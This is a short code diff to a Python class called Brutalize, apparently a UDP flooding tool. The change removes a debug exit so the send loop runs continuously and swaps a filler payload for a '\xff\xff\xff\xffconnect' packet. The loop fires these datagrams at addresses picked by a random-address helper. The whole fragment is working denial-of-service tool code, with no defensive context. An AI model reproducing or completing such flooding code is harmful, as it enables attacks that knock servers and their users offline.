@@ -69,9 +69,7 @@ class Brutalize:
     def send(self):
         while self.on:
             try:
-                self.data = str.encode("x" * self.force)
-                print(self.force)
-                exit(0)
+                self.data = str.encode("\xff\xff\xff\xffconnect")
                 self.client.sendto(self.data, self._randaddr())
                 self.sent += self.len
             except:
